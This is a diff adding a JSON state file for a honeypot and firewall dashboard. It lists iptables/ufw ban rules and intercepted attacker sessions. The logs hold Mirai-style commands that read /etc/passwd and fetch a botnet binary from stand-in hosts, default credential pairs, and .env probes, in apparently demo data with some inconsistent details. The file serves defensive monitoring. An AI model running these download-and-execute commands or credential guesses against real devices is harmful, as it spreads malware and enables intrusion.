@@ -1,0 +1,195 @@
+{
+  "timestamp": "2026-09-23T03:33:30.253Z",
+  "system": "AEGIS ULTIMATE HONEYPOT & FIREWALL IPS",
+  "status": {
+    "sshOnline": true,
+    "sshPort": 2222,
+    "telnetOnline": true,
+    "telnetPort": 2323,
+    "webTrapsOnline": true,
+    "totalConnectionsCaught": 18,
+    "totalCredentialsHarvested": 4,
+    "totalMaliciousCommands": 4,
+    "bannedIpsCount": 6,
+    "autoBlockEnabled": true
+  },
+  "activeFirewallRules": [
+    {
+      "id": "fw_192_168_1_42_1790134388840",
+      "ip": "192.168.1.42",
+      "reason": "Honeypot Intercept (SATCOM :2323)",
+      "firewallTool": "iptables",
+      "commandExecuted": "iptables -I INPUT -s 192.168.1.42 -j DROP",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "3:33:08 AM",
+      "packetsDropped": 1,
+      "active": true
+    },
+    {
+      "id": "fw_185_220_101_5",
+      "ip": "185.220.101.5",
+      "reason": "Web Trap Exfiltration: Attempted /.env download",
+      "firewallTool": "iptables",
+      "commandExecuted": "iptables -I INPUT -s 185.220.101.5 -j DROP",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "3:06:51 AM",
+      "packetsDropped": 142,
+      "active": true
+    },
+    {
+      "id": "fw_194_26_29_112",
+      "ip": "194.26.29.112",
+      "reason": "SSH Port 2222: Hydra credential brute-force probe",
+      "firewallTool": "iptables",
+      "commandExecuted": "iptables -I INPUT -s 194.26.29.112 -j DROP",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "2:51:51 AM",
+      "packetsDropped": 89,
+      "active": true
+    },
+    {
+      "id": "fw_45_154_255_88",
+      "ip": "45.154.255.88",
+      "reason": "Telnet Port 2323: Mirai botnet shell injection",
+      "firewallTool": "ufw",
+      "commandExecuted": "ufw deny from 45.154.255.88",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "2:36:51 AM",
+      "packetsDropped": 64,
+      "active": true
+    },
+    {
+      "id": "fw_198_51_100_22_1790133998822",
+      "ip": "198.51.100.22",
+      "reason": "ssh brute force",
+      "firewallTool": "iptables",
+      "commandExecuted": "iptables -I INPUT -s 198.51.100.22 -j DROP",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "3:26:38 AM",
+      "packetsDropped": 1,
+      "active": true
+    },
+    {
+      "id": "fw_185_190_140_23_1790134152439",
+      "ip": "185.190.140.23",
+      "reason": "Honeypot Intercept (TELNET :2323)",
+      "firewallTool": "iptables",
+      "commandExecuted": "iptables -I INPUT -s 185.190.140.23 -j DROP",
+      "executionStatus": "CONTAINER_ENFORCED",
+      "bannedAt": "3:29:12 AM",
+      "packetsDropped": 1,
+      "active": true
+    }
+  ],
+  "interceptedLogs": [
+    {
+      "service": "SATCOM",
+      "port": 2323,
+      "sourceIp": "185.190.140.23",
+      "action": "Telstar 11N Telemetry Link Intercept: Spoofed Uplink Gain Request",
+      "command": "SET_UPLINK_GAIN 14.0dB [STIA_OVERRIDE]",
+      "payload": "IPoS SatCom Channel | Target: Ottawa Teleport [45.34011, -75.63116]",
+      "blocked": true,
+      "firewallRule": "ip route add blackhole 185.190.140.23",
+      "severity": "CRITICAL",
+      "id": "hp_log_1790134064000_dbbe6",
+      "timestamp": "3:27:44 AM",
+      "rawTimestamp": 1790134064000
+    },
+    {
+      "service": "WEB",
+      "port": 3000,
+      "sourceIp": "185.190.140.23",
+      "action": "HTTP GET /.env - Malicious Crawler Decoy Triggered",
+      "payload": "GET /.env HTTP/1.1 | User-Agent: Mozilla/5.0 (Hydra-Recon-PQC)",
+      "blocked": true,
+      "firewallRule": "iptables -I INPUT -s 185.190.140.23 -j DROP",
+      "severity": "CRITICAL",
+      "id": "hp_log_1790134059031_j2b8y",
+      "timestamp": "3:27:39 AM",
+      "rawTimestamp": 1790134059031
+    },
+    {
+      "service": "TELNET",
+      "port": 2323,
+      "sourceIp": "185.190.140.23",
+      "sourcePort": 46067,
+      "action": "Telnet Shell Hijack & Command Sequence Intercepted",
+      "credentials": {
+        "username": "cisco",
+        "password": "cisco123"
+      },
+      "command": "show running-config; cat /etc/passwd; wget http://c2.botnet.cc/mirai.arm7",
+      "payload": "Telnet Session on :2323 | CMD: show running-config; cat /etc/passwd; wget http://c2.botnet.cc/mirai.arm7",
+      "blocked": true,
+      "firewallRule": "ufw deny from 185.190.140.23",
+      "severity": "CRITICAL",
+      "id": "hp_log_1790134051029_q1ln8",
+      "timestamp": "3:27:31 AM",
+      "rawTimestamp": 1790134051029
+    },
+    {
+      "id": "hp_log_1",
+      "timestamp": "2:36:51 AM",
+      "rawTimestamp": 1790131011989,
+      "service": "WEB",
+      "port": 3000,
+      "sourceIp": "185.220.101.5",
+      "action": "HTTP GET /.env (Environment configuration file probe)",
+      "payload": "GET /.env HTTP/1.1 - User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1)",
+      "blocked": true,
+      "firewallRule": "iptables -I INPUT -s 185.220.101.5 -j DROP",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "hp_log_2",
+      "timestamp": "2:51:51 AM",
+      "rawTimestamp": 1790131911989,
+      "service": "SSH",
+      "port": 2222,
+      "sourceIp": "194.26.29.112",
+      "sourcePort": 48922,
+      "action": "SSH Key Exchange & Auth probe intercepted",
+      "credentials": {
+        "username": "root",
+        "password": "password123"
+      },
+      "payload": "SSH-2.0-libssh-0.8.1 | Auth Method: password | User: root",
+      "blocked": true,
+      "firewallRule": "iptables -I INPUT -s 194.26.29.112 -j DROP",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "hp_log_3",
+      "timestamp": "3:06:51 AM",
+      "rawTimestamp": 1790132811989,
+      "service": "TELNET",
+      "port": 2323,
+      "sourceIp": "45.154.255.88",
+      "sourcePort": 37812,
+      "action": "Telnet Login & Shell Command Injection",
+      "credentials": {
+        "username": "admin",
+        "password": "admin"
+      },
+      "command": "cat /proc/mounts; wget http://198.51.100.8/bins/mirai.arm7 -O /tmp/drop; chmod 777 /tmp/drop",
+      "payload": "Mirai Botnet Staging Sequence",
+      "blocked": true,
+      "firewallRule": "ufw deny from 45.154.255.88",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "hp_log_4",
+      "timestamp": "3:16:51 AM",
+      "rawTimestamp": 1790133411989,
+      "service": "SATCOM",
+      "port": 2323,
+      "sourceIp": "192.168.1.42",
+      "action": "Telstar 11N Unencrypted Teleport MODBUS Intercept",
+      "command": "SET_UPLINK_GAIN 12.5dB",
+      "payload": "VSAT Link Budget Override Attempt (Ottawa Teleport Sector)",
+      "blocked": false,
+      "severity": "WARN"
+    }
+  ]
+}
